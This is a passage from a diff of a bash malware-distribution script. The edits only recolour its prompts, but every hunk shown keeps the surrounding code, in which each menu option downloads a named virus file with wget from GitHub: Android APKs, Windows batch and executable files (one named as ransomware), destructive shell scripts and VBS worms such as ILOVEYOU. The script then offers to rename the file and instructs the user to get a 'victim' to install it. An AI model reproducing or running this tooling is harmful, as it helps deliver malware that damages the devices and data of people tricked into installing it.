-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Enter new name: "
+         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv crd.apk $newName.apk
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
@@ -672,10 +672,10 @@ if [ $zCh = 1 ]; then
       fi
    elif [ $apkVirus = 34 ]; then
       wget https://github.com/LOoLzeC/vcrt/raw/master/dendroid.apk
-      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Do you want to change the virus name? (y/n)"
+      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
       read change
       if [ "$change" = "y" ]; then
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Enter new name: "
+         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv dendroid.apk $newName.apk
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
@@ -690,10 +690,10 @@ if [ $zCh = 1 ]; then
       fi
    elif [ $apkVirus = 35 ]; then
       wget https://github.com/LOoLzeC/vcrt/raw/master/ds.apk
-      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Do you want to change the virus name? (y/n)"
+      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
       read change
       if [ "$change" = "y" ]; then
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Enter new name: "
+         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv ds.apk $newName.apk
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
@@ -708,10 +708,10 @@ if [ $zCh = 1 ]; then
       fi
    elif [ $apkVirus = 36 ]; then
       wget https://github.com/LOoLzeC/vcrt/raw/master/fake_av.apk
-      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Do you want to change the virus name? (y/n)"
+      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
       read change
       if [ "$change" = "y" ]; then
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Enter new name: "
+         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv fake_av.apk $newName.apk
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
@@ -726,10 +726,10 @@ if [ $zCh = 1 ]; then
       fi
    elif [ $apkVirus = 37 ]; then
       wget https://github.com/Gameye98/V1RU5/raw/master/Grave.apk
-      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Do you want to change the virus name? (y/n)"
+      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
       read change
       if [ "$change" = "y" ]; then
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Enter new name: "
+         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv Grave.apk $newName.apk
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
@@ -744,10 +744,10 @@ if [ $zCh = 1 ]; then
       fi
    elif [ $apkVirus = 38 ]; then
       wget https://github.com/Gameye98/V1RU5/raw/master/Malum.apk
-      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Do you want to change the virus name? (y/n)"
+      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
       read change
       if [ "$change" = "y" ]; then
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Enter new name: "
+         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv Malum.apk $newName.apk
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
@@ -762,10 +762,10 @@ if [ $zCh = 1 ]; then
       fi
    elif [ $apkVirus = 39 ]; then
       wget https://github.com/Gameye98/V1RU5/raw/master/Mobile_Legends_Adventure.apk
-      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Do you want to change the virus name? (y/n)"
+      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
       read change
       if [ "$change" = "y" ]; then
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Enter new name: "
+         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv Mobile_Legends_Adventure.apk $newName.apk
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
@@ -780,10 +780,10 @@ if [ $zCh = 1 ]; then
       fi
    elif [ $apkVirus = 40 ]; then
       wget https://github.com/Gameye98/V1RU5/raw/master/TakeBeer.apk
-      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Do you want to change the virus name? (y/n)"
+      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
       read change
       if [ "$change" = "y" ]; then
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Enter new name: "
+         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv TakeBeer.apk $newName.apk
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
@@ -798,10 +798,10 @@ if [ $zCh = 1 ]; then
       fi
    elif [ $apkVirus = 41 ]; then
       wget https://github.com/Gameye98/V1RU5/raw/master/elite.apk
-      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Do you want to change the virus name? (y/n)"
+      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
       read change
       if [ "$change" = "y" ]; then
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Enter new name: "
+         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv elite.apk $newName.apk
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
@@ -816,10 +816,10 @@ if [ $zCh = 1 ]; then
       fi
    elif [ $apkVirus = 42 ]; then
       wget https://github.com/Gameye98/V1RU5/raw/master/mobelejen.apk
-      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Do you want to change the virus name? (y/n)"
+      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
       read change
       if [ "$change" = "y" ]; then
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Enter new name: "
+         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv mobelejen.apk $newName.apk
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim and make the victim install the apk virus \e[0m\e[34m"
@@ -854,10 +854,10 @@ elif [ $zCh = 2 ]; then
    echo -e "\e[0m"
    if [ $winChB = 1 ]; then
       wget https://raw.githubusercontent.com/LOoLzeC/vcrt/master/RIP.bat
-      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Do you want to change the virus name? (y/n)"
+      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
       read change
       if [ "$change" = "y" ]; then
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Enter new name: "
+         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv RIP.bat $newName.bat
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
@@ -872,10 +872,10 @@ elif [ $zCh = 2 ]; then
       fi
    elif [ $winChB = 2 ]; then
       wget https://github.com/LOoLzeC/vcrt/raw/master/RansomwareFileDecryptor.exe
-      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Do you want to change the virus name? (y/n)"
+      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
       read change
       if [ "$change" = "y" ]; then
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Enter new name: "
+         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv RansomwareFileDecryptor.exe $newName.exe
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
@@ -890,10 +890,10 @@ elif [ $zCh = 2 ]; then
       fi
    elif [ $winChB = 3 ]; then
       wget https://raw.githubusercontent.com/LOoLzeC/vcrt/master/cmd.bat
-            echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Do you want to change the virus name? (y/n)"
+            echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
       read change
       if [ "$change" = "y" ]; then
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Enter new name: "
+         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv cmd.bat $newName.bat
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
@@ -908,10 +908,10 @@ elif [ $zCh = 2 ]; then
       fi
    elif [ $winChB = 4 ]; then
       wget https://raw.githubusercontent.com/LOoLzeC/vcrt/master/koce.bat
-      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Do you want to change the virus name? (y/n)"
+      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
       read change
       if [ "$change" = "y" ]; then
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Enter new name: "
+         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv koce.bat $newName.bat
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
@@ -926,10 +926,10 @@ elif [ $zCh = 2 ]; then
       fi   
    elif [ $winChB = 5 ]; then
       wget https://raw.githubusercontent.com/LOoLzeC/vcrt/master/kuis.bat
-      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Do you want to change the virus name? (y/n)"
+      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
       read change
       if [ "$change" = "y" ]; then
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Enter new name: "
+         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv kuis.bat $newName.bat
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
@@ -944,10 +944,10 @@ elif [ $zCh = 2 ]; then
       fi
    elif [ $winChB = 6 ]; then
       wget https://raw.githubusercontent.com/LOoLzeC/vcrt/master/reg-eater.bat
-      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Do you want to change the virus name? (y/n)"
+      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
       read change
       if [ "$change" = "y" ]; then
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Enter new name: "
+         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv reg-eater.bat $newName.bat
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
@@ -962,10 +962,10 @@ elif [ $zCh = 2 ]; then
       fi
    elif [ $winChB = 7 ]; then
       wget https://raw.githubusercontent.com/LOoLzeC/vcrt/master/sleepy.bat
-      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Do you want to change the virus name? (y/n)"
+      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
       read change
       if [ "$change" = "y" ]; then
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Enter new name: "
+         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv sleely.bat $newName.bat
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
@@ -980,10 +980,10 @@ elif [ $zCh = 2 ]; then
       fi
    elif [ $winChB = 8 ]; then
       wget https://raw.githubusercontent.com/LOoLzeC/vcrt/master/ugly.bat
-      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Do you want to change the virus name? (y/n)"
+      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
       read change
       if [ "$change" = "y" ]; then
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Enter new name: "
+         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv ugly.bat $newName.bat
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
@@ -998,10 +998,10 @@ elif [ $zCh = 2 ]; then
       fi
    elif [ $winChB = 9 ]; then
       wget https://raw.githubusercontent.com/Gameye98/V1RU5/master/PCT.bat
-      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Do you want to change the virus name? (y/n)"
+      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
       read change
       if [ "$change" = "y" ]; then
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Enter new name: "
+         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv PCT.bat $newName.bat
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
@@ -1016,10 +1016,10 @@ elif [ $zCh = 2 ]; then
       fi
    elif [ $winChB = 10 ]; then
       wget https://raw.githubusercontent.com/Gameye98/V1RU5/master/regeater.bat
-      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Do you want to change the virus name? (y/n)"
+      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
       read change
       if [ "$change" = "y" ]; then
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Enter new name: "
+         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv regeater.bat $newName.bat
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
@@ -1049,10 +1049,10 @@ elif [ $zCh = 3 ]; then
    echo -e "\e[0m"
    if [ $ChB = 1 ]; then
       wget https://raw.githubusercontent.com/LOoLzeC/vcrt/master/bootloop.sh
-      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Do you want to change the virus name? (y/n)"
+      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
       read change
       if [ "$change" = "y" ]; then
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Enter new name: "
+         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv bootloop.sh $newName.sh
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
@@ -1067,10 +1067,10 @@ elif [ $zCh = 3 ]; then
       fi
    elif [ $ChB = 2 ]; then
       wget https://raw.githubusercontent.com/LOoLzeC/vcrt/master/data-eater.sh
-      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Do you want to change the virus name? (y/n)"
+      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
       read change
       if [ "$change" = "y" ]; then
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Enter new name: "
+         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv data-eater.sh $newName.sh
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
@@ -1085,10 +1085,10 @@ elif [ $zCh = 3 ]; then
       fi
    elif [ $ChB = 3 ]; then
       wget https://raw.githubusercontent.com/Gameye98/V1RU5/master/freeze.sh
-      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Do you want to change the virus name? (y/n)"
+      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
       read change
       if [ "$change" = "y" ]; then
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Enter new name: "
+         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv freeze.sh $newName.sh
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
@@ -1103,10 +1103,10 @@ elif [ $zCh = 3 ]; then
       fi
    elif [ $ChB = 4 ]; then
       wget https://raw.githubusercontent.com/Gameye98/V1RU5/master/lil_virus.sh
-      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Do you want to change the virus name? (y/n)"
+      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
       read change
       if [ "$change" = "y" ]; then
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Enter new name: "
+         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv lil_virus.sh $newName.sh
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
@@ -1121,10 +1121,10 @@ elif [ $zCh = 3 ]; then
       fi
    elif [ $ChB = 5 ]; then
       wget https://raw.githubusercontent.com/Gameye98/V1RU5/master/trash.sh
-      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Do you want to change the virus name? (y/n)"
+      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
       read change
       if [ "$change" = "y" ]; then
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Enter new name: "
+         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv trash.sh $newName.sh
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
@@ -1152,10 +1152,10 @@ elif [ $zCh = 4 ]; then
    echo -e "\e[0m"
    if [ $zch = 1 ]; then
       wget https://raw.githubusercontent.com/LOoLzeC/vcrt/master/alay.vbs
-      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Do you want to change the virus name? (y/n)"
+      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
       read change
       if [ "$change" = "y" ]; then
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Enter new name: "
+         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv alay.vbs $newName.vbs
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
@@ -1170,10 +1170,10 @@ elif [ $zCh = 4 ]; then
       fi
    elif [ $zch = 2 ]; then
       wget https://raw.githubusercontent.com/LOoLzeC/vcrt/master/capslock.vbs
-      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Do you want to change the virus name? (y/n)"
+      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
       read change
       if [ "$change" = "y" ]; then
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Enter new name: "
+         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv capslock.vbs $newName.vbs
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
@@ -1188,10 +1188,10 @@ elif [ $zCh = 4 ]; then
       fi
    elif [ $zch = 3 ]; then
       wget https://raw.githubusercontent.com/Gameye98/V1RU5/master/ILOVEYOU.vbs
-      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Do you want to change the virus name? (y/n)"
+      echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mDo you want to change the virus name? (y/n)\e[0m\e[34m"
       read change
       if [ "$change" = "y" ]; then
-         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m Enter new name: "
+         echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mEnter new name: \e[0m\e[34m"
          read newName
          mv ILOVEYOU.vbs $newName.vbs
          echo -e "\e[94m[\e[0m\e[92mZ\e[0m\e[94m]\e[0m \e[32mGive this link to your victim: \e[0m\e[34m"
